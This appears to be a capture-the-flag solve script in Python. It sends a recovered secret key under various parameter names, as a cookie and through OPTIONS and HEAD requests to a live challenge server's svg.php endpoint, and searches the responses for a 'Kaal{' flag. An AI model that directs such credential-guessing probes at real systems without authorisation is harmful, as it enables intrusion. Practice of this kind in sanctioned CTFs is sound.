#!/usr/bin/env python3
"""
Final comprehensive solve - try everything
"""

import requests
import time

TARGET_URL = "http://138.199.163.92:12669/"
SECRET_KEY = "Th1s_is_4_Str0ng_M4ster_Secret_Key_2026!!"
ROBOTS_HINT = "q355q636678723p4"

print("="*60)
print("FINAL COMPREHENSIVE SOLVE")
print("="*60)

time.sleep(25)

# Try different parameter combinations
test_params = [
    {'secret': SECRET_KEY, 'format': 'flag'},
    {'secret': SECRET_KEY, 'decode': 'true'},
    {'secret': SECRET_KEY, 'flag': 'true'},
    {'secret': SECRET_KEY, 'key': ROBOTS_HINT},
    {'password': SECRET_KEY},
    {'auth': SECRET_KEY},
]

for params in test_params:
    print(f"\n[*] Trying params: {params}")
    try:
        resp = requests.get(TARGET_URL + "svg.php", params=params, timeout=10)
        print(f"  Status: {resp.status_code}, Length: {len(resp.text)}")
        
        # Check for flag in response
        if 'Kaal{' in resp.text or 'kaal{' in resp.text.lower():
            print(f"\n{'='*60}")
            print(f"FLAG FOUND!")
            print(f"{'='*60}")
            import re
            flag = re.search(r'Kaal\{[^}]+\}', resp.text, re.IGNORECASE)
            if flag:
                print(flag.group(0))
                exit(0)
        
        # Check headers
        for header, value in resp.headers.items():
            if 'flag' in header.lower() or 'kaal' in str(value).lower():
                print(f"  [!] Interesting header: {header}: {value}")
        
        time.sleep(3)
    except Exception as e:
        print(f"  Error: {e}")

# Try accessing with cookies
print("\n[*] Trying with cookies...")
time.sleep(5)

cookies = {'secret': SECRET_KEY}
resp = requests.get(TARGET_URL + "svg.php", cookies=cookies)
print(f"  Status: {resp.status_code}")
if 'Kaal{' in resp.text:
    print(f"  FLAG: {resp.text}")

# Try other HTTP methods
print("\n[*] Trying different HTTP methods...")
time.sleep(5)

for method in ['OPTIONS', 'HEAD']:
    try:
        resp = requests.request(method, TARGET_URL + "svg.php", params={'secret': SECRET_KEY})
        print(f"  {method}: {resp.status_code}")
        print(f"  Headers: {dict(resp.headers)}")
    except Exception as e:
        print(f"  {method}: Error - {e}")

print("\n" + "="*60)
print("If no flag found, the challenge might require:")
print("1. Rendering the SVG visually to see the flag")
print("2. Multiple sequential requests with timing")
print("3. A specific combination we haven't tried")
print("="*60)
